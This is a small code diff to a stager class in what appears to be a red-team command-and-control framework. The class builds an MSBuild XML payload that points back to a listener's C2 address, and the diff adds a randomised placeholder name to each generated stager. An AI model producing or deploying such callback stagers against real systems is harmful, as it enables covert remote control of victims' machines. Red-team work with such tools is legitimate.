@@ -1,5 +1,5 @@
 from core.teamserver.stager import Stager
-
+from core.utils import gen_random_string_no_digits
 class STStager(Stager):
     def __init__(self):
         self.name = 'msbuild'
@@ -10,9 +10,10 @@ class STStager(Stager):
         self.options = {}
 
     def generate(self, listener):
-        with open('stagers/templates/msbuild.xml') as template:
+        with open('./core/teamserver/stagers/templates/msbuild.xml') as template:
             template = template.read()
             template = template.replace('C2_URL', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
+            template = template.replace("NAME_GOES_HERE", gen_random_string_no_digits(5))
             return template
 
             #print_good(f"Generated stager to {stager.name}")
